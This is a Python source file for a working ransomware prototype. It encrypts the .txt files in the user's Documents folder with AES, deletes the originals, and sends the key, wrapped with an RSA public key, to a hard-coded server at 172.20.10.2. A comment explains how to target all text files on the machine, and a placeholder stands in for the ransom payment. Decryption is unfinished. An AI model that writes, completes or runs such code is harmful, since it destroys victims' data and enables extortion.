import socket
import random
import string
from Crypto.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import os
import glob
from cryptography.hazmat.primitives.asymmetric import padding, rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric.padding import OAEP



def generate_key(length=16):
    characters = string.ascii_letters + string.digits + string.punctuation
    key = ''.join(random.choice(characters) for i in range(length))
    return key

def find_all_files():
    # Uncomment when ready in order to get all text files on the PC
    # txt_files = glob.glob('**/*.txt', recursive=True)
    desktop_path = os.path.expanduser("~/Documents")
    file_pattern = os.path.join(desktop_path, "*.txt")
    txt_files = glob.glob(file_pattern)
    return txt_files

def encrypt_file(file_path, key):
    iv = os.urandom(16)
    with open(file_path, 'rb') as f:
        message = f.read()
        padded_message = message + ((16 - len(message) % 16) * chr(16 - len(message) % 16)).encode()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        encrypted_message = cipher.encrypt(padded_message)
        with open(file_path + '.encrypted', 'wb') as f_out:
            f_out.write(iv + encrypted_message)
    os.remove(file_path)


def find_all_encrypted_files():
    txt_files = glob.glob('**/*.encrypted', recursive=True)
    return txt_files

def save_key(key, file_name='Key.key'):
    desktop_path = os.path.expanduser("~/Documents")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, 'wb') as f:
        f.write(key)


def read_key(file_name='Key.key'):
    desktop_path = os.path.expanduser("~/Documents")
    file_path = os.path.join(desktop_path, file_name)
    with open(file_path, 'rb') as f:
        key = f.read()
    return key
def encrypt_using_public(public_key, message):
    pk = RSA.import_key(public_key)
    cipher = PKCS1_OAEP.new(pk)
    ciphertext = cipher.encrypt(message)
    return ciphertext

def decrypt_using_private(private_key, ciphertext):
    pvk = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(pvk)
    plaintext = cipher.decrypt(ciphertext)
    return plaintext

key = generate_key(16)
bytes_key = key.encode('utf-8')


txt_files = find_all_files()

for file_path in txt_files:
    encrypt_file(file_path, bytes_key)

save_key(bytes_key)

#plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
#print (plaintext)

#connect to the server and send the encrypted key to it
SERVER_IP = '172.20.10.2'
SERVER_PORT = 5678 
#connect to the server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.connect((SERVER_IP, SERVER_PORT))

# Request public key from server
public_key = server_socket.recv(1024).decode()
print("Received public key:", public_key)

# Send "SUIII" message to server
server_socket.send(encrypt_using_public(public_key=public_key, message=bytes_key))


#simulate that the user paid (I will put some dummy operations for now)
x=2+2
y=3+3

#request decrypted AES key from the server
AES_key_received = server_socket.recv(1024).decode()
#if this prints true, then the process is successful
print(AES_key_received==key) #key is the original AES key


#decrypt all files

server_socket.close()

